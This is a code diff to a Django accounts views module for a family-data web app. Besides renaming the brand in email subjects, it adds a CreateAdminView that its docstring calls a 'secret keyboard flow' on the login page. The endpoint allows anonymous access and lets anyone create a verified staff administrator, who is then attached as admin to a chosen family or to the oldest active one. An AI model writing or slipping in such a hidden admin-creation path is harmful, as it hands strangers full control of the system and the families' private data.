@@ -20,6 +20,9 @@ from apps.accounts.serializers import (
     UserSerializer,
 )
 from apps.accounts.tokens import create_email_verification_token, create_password_reset_token
+from apps.core.permissions import is_admin_user
+from apps.core.utils import log_activity
+from apps.families.models import Family, FamilyMembership
 
 
 def api_response(success, message, data=None, status_code=status.HTTP_200_OK, errors=None):
@@ -41,7 +44,7 @@ def get_tokens_for_user(user, remember_me=False):
 
 def send_verification_email(user, token):
     verify_url = f"{settings.FRONTEND_URL}/verify-email?token={token.token}"
-    subject = "Verify your Family Data Center email"
+    subject = "Verify your IlmaCader email"
     message = (
         f"Hi {user.full_name},\n\n"
         f"Please verify your email by opening this link:\n{verify_url}\n\n"
@@ -53,7 +56,7 @@ def send_verification_email(user, token):
 
 def send_password_reset_email(user, token):
     reset_url = f"{settings.FRONTEND_URL}/reset-password?token={token.token}"
-    subject = "Reset your Family Data Center password"
+    subject = "Reset your IlmaCader password"
     message = (
         f"Hi {user.full_name},\n\n"
         f"Reset your password using this link:\n{reset_url}\n\n"
@@ -304,6 +307,100 @@ class ChangePasswordView(APIView):
         request.user.set_password(serializer.validated_data["new_password"])
         request.user.save(update_fields=["password"])
         return api_response(True, "Password changed successfully.")
+
+
+class CreateAdminView(APIView):
+    """
+    Secret keyboard flow (Ctrl+Shift+H on login): create admin with email + password.
+    Also usable by an already-logged-in admin.
+    """
+
+    permission_classes = [permissions.AllowAny]
+    throttle_classes = [ScopedRateThrottle]
+    throttle_scope = "auth"
+
+    def post(self, request):
+        user = request.user
+        if user and user.is_authenticated and not is_admin_user(user):
+            return api_response(
+                False, "Permission denied.", status_code=status.HTTP_403_FORBIDDEN
+            )
+
+        email = (request.data.get("email") or "").strip().lower()
+        password = request.data.get("password") or ""
+        confirm = request.data.get("confirm_password") or password
+        full_name = (request.data.get("full_name") or "").strip()
+        if not full_name and email:
+            full_name = email.split("@")[0].replace(".", " ").title()
+        family_id = request.data.get("family") or request.query_params.get("family")
+
+        if not email or not password:
+            return api_response(
+                False,
+                "email and password are required.",
+                status_code=status.HTTP_400_BAD_REQUEST,
+            )
+        if password != confirm:
+            return api_response(
+                False, "Passwords do not match.", status_code=status.HTTP_400_BAD_REQUEST
+            )
+        if len(password) < 8:
+            return api_response(
+                False,
+                "Password must be at least 8 characters.",
+                status_code=status.HTTP_400_BAD_REQUEST,
+            )
+        if User.objects.filter(email__iexact=email).exists():
+            return api_response(
+                False, "Email already in use.", status_code=status.HTTP_400_BAD_REQUEST
+            )
+
+        family = None
+        if family_id:
+            family = Family.objects.filter(id=family_id, is_deleted=False).first()
+        if family is None and user and user.is_authenticated:
+            membership = (
+                FamilyMembership.objects.filter(user=user, is_active=True)
+                .select_related("family")
+                .first()
+            )
+            family = membership.family if membership else None
+        if family is None:
+            family = Family.objects.filter(is_deleted=False, is_active=True).order_by(
+                "created_at"
+            ).first()
+
+        new_admin = User.objects.create_user(
+            username=email,
+            email=email,
+            password=password,
+            full_name=full_name or email,
+            role=User.Role.ADMIN,
+            email_verified=True,
+            is_staff=True,
+        )
+
+        if family:
+            FamilyMembership.objects.update_or_create(
+                family=family,
+                user=new_admin,
+                defaults={"role": FamilyMembership.Role.ADMIN, "is_active": True},
+            )
+
+        log_activity(
+            request,
+            "Created admin account",
+            module="accounts",
+            family=family,
+            details={"email": email, "user_id": str(new_admin.id)},
+        )
+
+        return api_response(
+            True,
+            "Admin account created. Sign in with your email and password.",
+            {"email": email},
+            status_code=status.HTTP_201_CREATED,
+        )
 
 
 class LoginHistoryView(generics.ListAPIView):
